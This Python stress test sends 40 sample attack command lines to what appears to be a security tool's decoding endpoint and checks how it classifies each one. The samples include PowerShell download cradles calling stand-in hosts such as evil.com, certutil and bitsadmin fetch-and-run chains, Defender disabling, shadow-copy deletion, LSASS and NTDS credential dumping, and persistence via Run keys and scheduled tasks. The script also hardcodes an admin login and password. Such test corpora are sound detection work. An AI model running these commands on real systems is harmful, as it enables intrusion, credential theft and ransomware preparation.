"""Stress test — /api/decode/guidance across 20 heavily-encoded + 20
plaintext command lines (per user's Feb 2026 request).

Verifies:
  * Engine used (llm vs deterministic-fallback)
  * `kind` classification correctness against expected label
  * `recommended` button ordering makes sense for the payload family
  * Latency per call
"""
from __future__ import annotations
import base64
import json
import os
import time
from typing import Any, Dict, List, Tuple

import requests

API = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/")
if not API:
    with open("/app/frontend/.env") as f:
        for ln in f:
            if ln.startswith("REACT_APP_BACKEND_URL="):
                API = ln.split("=", 1)[1].strip().rstrip("/")
                break

r = requests.post(f"{API}/api/auth/login",
                  json={"email": "admin@nivxray.com",
                        "password": "NivXRay#2026!"},
                  timeout=15)
r.raise_for_status()
H = {"Authorization": f"Bearer {r.json()['access_token']}",
     "Content-Type": "application/json"}
print(f"AUTH OK · {API}")


def b64(x: str) -> str:
    return base64.b64encode(x.encode()).decode()


def b64_utf16le(x: str) -> str:
    return base64.b64encode(x.encode("utf-16le")).decode()


# ── 20 heavily-encoded / multi-encoding chain payloads ────────────
ENCODED: List[Tuple[str, str, str]] = [   # (name, expected_kind, input)
    ("PS -enc utf16le download-cradle", "encoded",
     "powershell -nop -w hidden -enc " + b64_utf16le('IEX(New-Object Net.WebClient).DownloadString("http://evil.com/a.ps1")')),
    ("nested b64 (double wrap)", "encoded",
     b64(b64("powershell -c IEX(iwr https://c2.evil/x.ps1)"))),
    ("hex-encoded PS", "encoded",
     "70:6f:77:65:72:73:68:65:6c:6c:20:2d:63:20:69:65:78:28:69:77:72:20:68:74:74:70:3a:2f:2f:65:76:69:6c:2f:2e:63:6f:6d:2f:79:2e:70:73:31:29"),
    ("url-encoded PS one-liner", "encoded",
     "powershell%20-c%20%22IEX(iwr%20http%3A%2F%2Fevil.com%2Fa.ps1)%22"),
    ("certutil download + b64 decode chain", "encoded",
     "certutil.exe -urlcache -f https://c2.example/m.txt m.txt & certutil.exe -decode m.txt m.exe"),
    ("PS FromBase64String piped to iex", "encoded",
     f"powershell -c \"$s='{b64('IEX(iwr http://x/y.ps1)')}';iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s)))\""),
    ("gzip magic b64 wrapped", "encoded",
     base64.b64encode(b'\x1f\x8b\x08\x00' + b'A' * 200).decode()),
    ("regsvr32 sct + b64 body", "multi_line_chain",
     "regsvr32 /s /n /u /i:http://c2.evil/s.sct scrobj.dll\n" +
     "powershell -enc " + b64_utf16le("IEX(iwr http://c2.evil/y.ps1)")),
    ("triple-stage b64 → hex → PS", "multi_line_chain",
     "certutil -decode a.b64 a.hex\n" +
     "certutil -decodehex a.hex a.exe\n" +
     "rundll32 a.dll,Entry"),
    ("ROT13 obfuscated PS", "unclear_cipher",
     "cbjreFuryy.rkr -Abc -j uvqqra -p vrk(vje uggc://p8.rknzcyr/z.cf1)"),
    ("mshta remote + inline b64 exec", "multi_line_chain",
     "mshta.exe http://c2.evil/x.hta\n" +
     "powershell -enc " + b64_utf16le("iex(iwr http://c2.evil/z.ps1)")),
    ("XOR-loop shellcode bytes", "unclear_cipher",
     "".join(f"\\x{(0x90 ^ 0x41):02x}" * 40)),
    ("empire-style Base64 launcher", "encoded",
     "powershell.exe -NoP -sta -NonI -W Hidden -Enc " + b64_utf16le(
        '$c=New-Object Net.WebClient;$c.Headers.Add("User-Agent","Mozilla/5.0");'
        'iex $c.DownloadString("http://c2/launcher.ps1")')),
    ("nested certutil + wmic pivot", "multi_line_chain",
     "certutil -urlcache -f https://c2.evil/f.exe f.exe\n" +
     "wmic /node:10.0.0.5 process call create \"f.exe\"\n" +
     "schtasks /create /sc onlogon /tn Health /tr f.exe"),
    ("Reverse-b64 (base64 of reversed str)", "encoded",
     b64("1sp.a/moc.live//:ptth rwi(xei c- llehsrewop"[::-1])),
    ("bitsadmin download + hex decode", "multi_line_chain",
     "bitsadmin /transfer j http://c2/x.txt C:\\x.txt\n" +
     "certutil -decodehex C:\\x.txt C:\\x.exe\n" +
     "start C:\\x.exe"),
    ("PowerShell string concat obfuscation", "encoded",
     '$a="Inv";$b="oke-Exp";$c="ression";& ($a+$b+$c) (New-Object Net.WebClient).DownloadString("http://c/f.ps1")'),
    ("VBS wscript.shell b64", "encoded",
     'cscript.exe //nologo dropper.vbs ' + b64('WScript.Shell.Run "cmd /c powershell -c iex(iwr http://x)"')),
    ("Char-code array obfuscation (JS)", "unclear_cipher",
     "String.fromCharCode(112,111,119,101,114,115,104,101,108,108,32,45,99,32,105,101,120,40,105,119,114,32,104,116,116,112,58,47,47,101,118,105,108,47,120,46,112,115,49,41)"),
    ("Massive 4-stage cobalt-strike chain", "multi_line_chain",
     "bitsadmin /transfer j http://c2.example/stage.b64 C:\\s.b64\n" +
     "certutil.exe -decode C:\\s.b64 C:\\s.dll\n" +
     "rundll32.exe C:\\s.dll,Start\n" +
     "schtasks /create /sc onlogon /tn WindowsHealth /tr rundll32.exe /f"),
]

# ── 20 plaintext command lines (Medium-article style) ─────────────
PLAINTEXT: List[Tuple[str, str, str]] = [
    ("Get-EventLog Security", "plaintext_malicious",
     "Get-EventLog -LogName Security -Newest 100 | Where-Object {$_.EventID -eq 4625}"),
    ("Get-WinEvent PS operational", "plaintext_malicious",
     'Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 | Where-Object {$_.Id -in 4103,4104}'),
    ("Get-Process anomalous", "plaintext_malicious",
     "Get-Process | Where-Object {$_.Path -like '*Temp*' -or $_.Path -like '*AppData*'} | Select ProcessName,Id,Path"),
    ("Get-CimInstance Win32_StartupCommand", "plaintext_malicious",
     "Get-CimInstance -ClassName Win32_StartupCommand"),
    ("Get-ScheduledTask persistence hunt", "plaintext_malicious",
     "Get-ScheduledTask | Where-Object {$_.Actions.Execute -like '*powershell*' -or $_.Actions.Execute -like '*cmd*'}"),
    ("Get-NetTCPConnection non-common ports", "plaintext_malicious",
     "Get-NetTCPConnection | Where-Object {$_.State -eq 'Established' -and $_.RemotePort -notin 80,443,53}"),
    ("Get-LocalUser suspicious", "plaintext_malicious",
     "Get-LocalUser | Where-Object {$_.Enabled -eq $true -and $_.LastLogon -eq $null}"),
    ("Add-MpPreference exclusion (evasion)", "plaintext_malicious",
     "Add-MpPreference -ExclusionPath 'C:\\Temp\\evil.exe'"),
    ("Set-MpPreference disable RTM", "plaintext_malicious",
     "Set-MpPreference -DisableRealtimeMonitoring $true"),
    ("wmic shadowcopy delete (ransom precursor)", "plaintext_malicious",
     "wmic shadowcopy delete"),
    ("vssadmin delete shadows", "plaintext_malicious",
     "vssadmin.exe delete shadows /all /quiet"),
    ("net user creation", "plaintext_malicious",
     "net user Support Pass!2026 /add & net localgroup Administrators Support /add"),
    ("reg add Run key persistence", "plaintext_malicious",
     "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Health /d 'C:\\evil.exe' /f"),
    ("schtasks daily persistence", "plaintext_malicious",
     "schtasks /create /sc daily /tn 'Update' /tr 'powershell -c evil' /f"),
    ("bcdedit disable recovery", "plaintext_malicious",
     "bcdedit /set {default} recoveryenabled No"),
    ("wbadmin delete catalog", "plaintext_malicious",
     "wbadmin delete catalog -quiet"),
    ("netsh port-proxy pivot", "plaintext_malicious",
     "netsh interface portproxy add v4tov4 listenport=445 connectaddress=10.0.0.9"),
    ("Invoke-Mimikatz creds hunt", "plaintext_malicious",
     "IEX(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)"),
    ("esentutl VSS credential dump", "plaintext_malicious",
     "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\out\\ntds.dit"),
    ("rundll32 comsvcs minidump lsass", "plaintext_malicious",
     "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 624 C:\\lsass.dmp full"),
]


# ── Run ────────────────────────────────────────────────────────────
def call(payload: str) -> Tuple[Dict[str, Any], int]:
    t0 = time.time()
    r = requests.post(f"{API}/api/decode/guidance", headers=H,
                      json={"input": payload}, timeout=30)
    dt = int((time.time() - t0) * 1000)
    return (r.json() if r.status_code == 200 else {"_error": r.text[:200]}), dt


def run_bucket(bucket_name: str, cases: List[Tuple[str, str, str]]) -> List[Dict]:
    print(f"\n{'━'*78}\n{bucket_name} ({len(cases)})\n{'━'*78}")
    results = []
    for i, (name, expected_kind, payload) in enumerate(cases, 1):
        d, dt = call(payload)
        if "_error" in d:
            print(f"✗ {i:2d}  ERROR  {name[:55]:55s}  {d['_error'][:60]}")
            results.append({"name": name, "ok": False, "err": d["_error"]})
            continue
        got_kind = d.get("kind", "?")
        rec = d.get("recommended", [])
        signals = d.get("signals", [])
        engine = d.get("engine", "?")
        # Loose match — encoded ↔ multi_line_chain overlap allowed on
        # multi-stage encoded chains.
        kind_ok = (
            got_kind == expected_kind or
            (expected_kind == "encoded" and got_kind in {"encoded", "multi_line_chain"}) or
            (expected_kind == "multi_line_chain" and got_kind in {"multi_line_chain", "encoded"}) or
            (expected_kind == "plaintext_malicious" and got_kind in {"plaintext_malicious", "clean_text"})
        )
        tag = "✓" if kind_ok else "△"
        print(f"{tag} {i:2d}  {engine:22s}  {dt:5d}ms  {name[:40]:40s}  "
              f"kind={got_kind:20s}  rec[0]={rec[0] if rec else '-':20s}  "
              f"signals={len(signals)}")
        results.append({"name": name, "ok": kind_ok, "kind": got_kind,
                        "expected": expected_kind, "rec": rec,
                        "signals_count": len(signals), "engine": engine, "dt_ms": dt})
    return results


t0 = time.time()
enc_results = run_bucket("HEAVILY ENCODED / MULTI-STAGE CHAINS (20)", ENCODED)
plain_results = run_bucket("PLAINTEXT COMMAND LINES · Medium-article style (20)", PLAINTEXT)

# ── Summary ────────────────────────────────────────────────────────
all_results = enc_results + plain_results
total = len(all_results)
kind_ok = sum(1 for r in all_results if r.get("ok"))
llm_used = sum(1 for r in all_results if r.get("engine") == "llm")
fallback = sum(1 for r in all_results if "fallback" in (r.get("engine") or ""))
avg_dt = sum(r.get("dt_ms", 0) for r in all_results) // max(1, total)
print(f"\n{'━'*78}\nSUMMARY")
print(f"  Total          : {total}")
print(f"  Kind correct   : {kind_ok}/{total}  ({100 * kind_ok // total}%)")
print(f"  LLM engine     : {llm_used}/{total}  ({100 * llm_used // total}%)")
print(f"  Fallback       : {fallback}/{total}")
print(f"  Avg latency    : {avg_dt} ms")
print(f"  Wall time      : {int(time.time() - t0)} s")

# Save details for inspection
with open("/app/backend/tests/guidance_stress_results.json", "w") as f:
    json.dump({"encoded": enc_results, "plaintext": plain_results,
               "summary": {"total": total, "kind_correct": kind_ok,
                           "llm_used": llm_used, "avg_dt_ms": avg_dt}},
              f, indent=2)
print(f"\n  Details → /app/backend/tests/guidance_stress_results.json")
